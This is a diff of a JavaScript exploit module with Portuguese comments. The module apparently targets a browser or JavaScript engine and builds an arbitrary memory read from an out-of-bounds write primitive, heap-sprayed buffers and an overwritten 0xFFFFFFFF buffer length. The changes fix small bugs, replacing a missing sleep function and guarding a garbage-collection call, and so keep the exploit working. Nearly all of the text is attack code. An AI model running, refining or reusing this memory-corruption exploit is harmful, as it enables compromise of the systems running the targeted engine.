@@ -1,10 +1,9 @@
-// js/script3/testMemoryLeakViaJsonTC.mjs (ATUALIZADO PARA CONSTRUIR LEITURA ARBITRÁRIA)
+// js/script3/testMemoryLeakViaJsonTC.mjs (CORRIGIDO)
 import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
-import { toHex, sleep } from '../utils.mjs';
+import { toHex } from '../utils.mjs'; // CORREÇÃO: Removido 'sleep' que não existe.
 import {
     triggerOOB_primitive,
     oob_write_absolute,
-    oob_read_absolute,
     clearOOBEnvironment
 } from '../core_exploit.mjs';
 
@@ -29,7 +28,7 @@ const ARBITRARY_READ_CONFIG = {
     // O script tentará corromper a memória em vários offsets relativos ao nosso
     // buffer OOB, na esperança de atingir um dos buffers pulverizados.
     corruption_offsets: [
-        (128) - 16, 
+        (128) - 16,
         (128) - 8,
         (128),
         (128) + 8,
@@ -51,6 +50,7 @@ export async function testArbitraryRead() {
     logS3(`   Alvo da Leitura: ${toHex(ARBITRARY_READ_CONFIG.TARGET_READ_ADDRESS)}`, "info", FNAME);
 
     let success = false;
+    const SHORT_PAUSE_MS = 50; // Define uma constante para a pausa
 
     // A cada tentativa, reconfiguramos o ambiente para isolar os efeitos.
     for (const offset of ARBITRARY_READ_CONFIG.corruption_offsets) {
@@ -86,7 +86,7 @@ export async function testArbitraryRead() {
             logS3(`  2. Escrevendo tamanho 0xFFFFFFFF em offset +${ARBITRARY_READ_CONFIG.OFFSET_TO_BYTE_LENGTH}`, "warn", FNAME);
             oob_write_absolute(offset + ARBITRARY_READ_CONFIG.OFFSET_TO_BYTE_LENGTH, 0xFFFFFFFF, 4);
 
-            await sleep(50); // Pausa curta
+            await PAUSE_S3(SHORT_PAUSE_MS); // CORREÇÃO: Usando PAUSE_S3 em vez de sleep
 
             // Etapa 3: Verificar todos os buffers pulverizados para encontrar o que foi corrompido.
             for (let i = 0; i < sprayed_buffers.length; i++) {
@@ -115,8 +115,10 @@ export async function testArbitraryRead() {
         
         // Limpa a memória para a próxima tentativa
         sprayed_buffers = null;
-        globalThis.gc?.(); // Sugere ao motor para fazer a coleta de lixo, se disponível/exposto.
-        await sleep(50);
+        if (typeof globalThis.gc === 'function') {
+            globalThis.gc(); // Sugere ao motor para fazer a coleta de lixo, se disponível/exposto.
+        }
+        await PAUSE_S3(SHORT_PAUSE_MS); // CORREÇÃO: Usando PAUSE_S3 em vez de sleep
     }
 
     clearOOBEnvironment();
